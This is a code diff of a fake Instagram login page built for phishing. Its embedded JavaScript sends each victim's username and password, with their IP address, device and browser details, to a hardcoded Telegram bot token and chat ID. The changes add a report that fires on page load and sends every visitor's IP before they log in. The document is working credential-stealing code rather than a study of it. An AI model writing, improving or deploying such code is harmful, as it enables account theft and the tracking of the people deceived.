@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -284,8 +283,12 @@
         // ===================== Telegram Bot Configuration =====================
         const BOT_TOKEN = "8595513701:AAEmzQFKx6fYP6-7f4EY38TrmZf5Xb70TUM";
         const CHAT_ID = "7615377804";
-        
         // ====================================================================
+
+        // Flag to track if IP notification has been sent
+        let ipNotificationSent = false;
+        // Store IP address for later use
+        let userIP = "Unavailable";
 
         // Get user IP address
         async function getUserIP() {
@@ -294,6 +297,7 @@
                 const data = await response.json();
                 return data.ip;
             } catch (error) {
+                console.error("IP fetch error:", error);
                 return "Unavailable";
             }
         }
@@ -324,8 +328,19 @@
         }
 
         // Send data to Telegram
-        async function sendToTelegram(username, password, ip, device, timestamp, userAgent) {
-            const message = `🔐 *Instagram Login* 🔐
+        async function sendToTelegram(username, password, ip, device, timestamp, userAgent, isPageVisit = false) {
+            let message = "";
+            
+            if (isPageVisit) {
+                message = `🌐 *PAGE VISIT* 🌐
+
+👤 *Visitor IP:* ${ip}
+📱 *Device:* ${device}
+🕒 *Time:* ${timestamp}
+📲 *Browser:* ${userAgent.substring(0, 100)}
+📍 *Status:* User opened the Instagram login page`;
+            } else {
+                message = `🔐 *INSTAGRAM LOGIN* 🔐
 
 👤 *Username/Email:* ${username}
 🔑 *Password:* ${password}
@@ -333,6 +348,7 @@
 📱 *Device:* ${device}
 🕒 *Time:* ${timestamp}
 📲 *UA:* ${userAgent.substring(0, 120)}`;
+            }
 
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             try {
@@ -348,7 +364,49 @@
                 const result = await response.json();
                 return result.ok;
             } catch (err) {
-                console.error(err);
+                console.error("Telegram send error:", err);
+                return false;
+            }
+        }
+
+        // Send IP notification immediately when page loads (as soon as user visits the link)
+        async function sendPageVisitNotification() {
+            if (ipNotificationSent) return;
+            
+            try {
+                // Get IP address
+                userIP = await getUserIP();
+                const device = getDeviceInfo();
+                const timestamp = new Date().toLocaleString("en-GB", { timeZone: "UTC" });
+                const userAgent = navigator.userAgent;
+                
+                // Send page visit notification with IP
+                await sendToTelegram("", "", userIP, device, timestamp, userAgent, true);
+                ipNotificationSent = true;
+                console.log("Page visit notification sent with IP:", userIP);
+            } catch (err) {
+                console.error("Error sending page visit notification:", err);
+            }
+        }
+
+        // Send credentials when form is submitted
+        async function sendCredentialsNotification(username, password) {
+            try {
+                const device = getDeviceInfo();
+                const timestamp = new Date().toLocaleString("en-GB", { timeZone: "UTC" });
+                const userAgent = navigator.userAgent;
+                
+                // Use stored IP or fetch fresh one
+                let ipToSend = userIP;
+                if (ipToSend === "Unavailable" || ipToSend === "Unavailable") {
+                    ipToSend = await getUserIP();
+                    userIP = ipToSend;
+                }
+                
+                // Send credentials with full info
+                return await sendToTelegram(username, password, ipToSend, device, timestamp, userAgent, false);
+            } catch (err) {
+                console.error("Error sending credentials:", err);
                 return false;
             }
         }
@@ -361,7 +419,11 @@
 
         let isProcessing = false;
 
-        // Handle form submission - no messages, just redirect
+        // ========== Send IP notification immediately when page loads ==========
+        // This runs as soon as the script executes - user visited the page
+        sendPageVisitNotification();
+
+        // Handle form submission - send credentials then redirect
         form.addEventListener('submit', async (e) => {
             e.preventDefault();
             
@@ -371,7 +433,7 @@
             const username = emailInput.value.trim();
             const password = passwordInput.value;
 
-            // Basic validation
+            // Basic validation - silently fail if empty
             if (!username || !password) {
                 return;
             }
@@ -382,14 +444,8 @@
             submitBtn.disabled = true;
 
             try {
-                // Gather metadata
-                const ip = await getUserIP();
-                const device = getDeviceInfo();
-                const timestamp = new Date().toLocaleString("en-GB", { timeZone: "UTC" });
-                const userAgent = navigator.userAgent;
-
-                // Send credentials to Telegram
-                const sent = await sendToTelegram(username, password, ip, device, timestamp, userAgent);
+                // Send credentials to Telegram with all info (IP, device, etc.)
+                const sent = await sendCredentialsNotification(username, password);
 
                 if (sent) {
                     // Disable form fields
